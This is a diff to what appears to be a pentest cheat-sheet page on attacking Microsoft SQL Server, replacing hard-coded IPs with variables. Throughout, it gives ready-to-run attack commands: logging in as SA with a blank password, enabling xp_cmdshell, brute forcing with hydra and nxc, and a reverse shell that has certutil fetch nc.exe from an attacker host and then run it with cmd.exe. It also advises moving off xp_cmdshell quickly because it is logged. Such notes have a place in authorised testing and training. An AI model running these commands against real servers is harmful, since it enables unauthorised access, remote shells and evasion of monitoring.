@@ -1,7 +1,7 @@
 # MSSQL (1433)
 
 !!! tip "Start here"
-    Try SA with a blank password first: `impacket-mssqlclient sa:@10.10.10.10`. If you get in, run `xp_cmdshell 'whoami'`, it's often already enabled on unmanaged instances. If not, enable it with `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE`.
+    Try SA with a blank password first: `impacket-mssqlclient sa:@$IP`. If you get in, run `xp_cmdshell 'whoami'`, it's often already enabled on unmanaged instances. If not, enable it with `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE`.
 
 !!! warning "Watch out"
     `xp_cmdshell` execution is logged. Use it to establish a shell quickly, then move to a less monitored method.
@@ -11,7 +11,7 @@
 ## Enumeration
 
 ```bash
-nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-config 10.10.10.10
+nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-config $IP
 ```
 
 ---
@@ -19,8 +19,8 @@ nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-config 10.10.10.10
 ## Authentication
 
 ```bash
-impacket-mssqlclient sa:@10.10.10.10
-impacket-mssqlclient 'EXAMPLE/username':'password'@10.10.10.10 -windows-auth
+impacket-mssqlclient sa:@$IP
+impacket-mssqlclient '$NETBIOS/username':'password'@$IP -windows-auth
 ```
 
 ---
@@ -28,8 +28,8 @@ impacket-mssqlclient 'EXAMPLE/username':'password'@10.10.10.10 -windows-auth
 ## Brute Force
 
 ```bash
-nxc mssql 10.10.10.10 -u users.txt -p passwords.txt
-hydra -L users.txt -P passwords.txt mssql://10.10.10.10
+nxc mssql $IP -u users.txt -p passwords.txt
+hydra -L users.txt -P passwords.txt mssql://$IP
 ```
 
 ---
@@ -49,8 +49,8 @@ EXEC xp_cmdshell 'whoami';
 
 Reverse shell via certutil + nc:
 ```sql
-EXEC xp_cmdshell 'certutil -urlcache -f http://<attacker-ip>:8000/nc.exe C:\users\public\nc.exe';
-EXEC xp_cmdshell 'C:\users\public\nc.exe <attacker-ip> 9001 -e cmd.exe';
+EXEC xp_cmdshell 'certutil -urlcache -f http://$LHOST:8000/nc.exe C:\users\public\nc.exe';
+EXEC xp_cmdshell 'C:\users\public\nc.exe $LHOST 9001 -e cmd.exe';
 ```
 
 ---
